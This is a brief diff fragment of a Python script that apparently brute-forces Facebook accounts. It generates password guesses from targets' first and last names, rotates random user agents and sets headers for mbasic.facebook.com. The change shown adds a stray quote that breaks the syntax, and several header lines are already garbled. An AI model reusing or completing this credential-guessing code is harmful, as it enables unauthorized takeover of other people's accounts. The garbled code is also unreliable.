@@ -212,7 +212,7 @@ def m1(ids,names,passlist):
                 for fikr in passlist:
                	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
-                        head = {''authority': 'mbasic.facebook.com',
+                        'head = {''authority': 'mbasic.facebook.com',
     'x-fb-rlaf'r: '0',
     'access-control-allow-origin': '*',
     'facebook-api-version': 'v16.0',
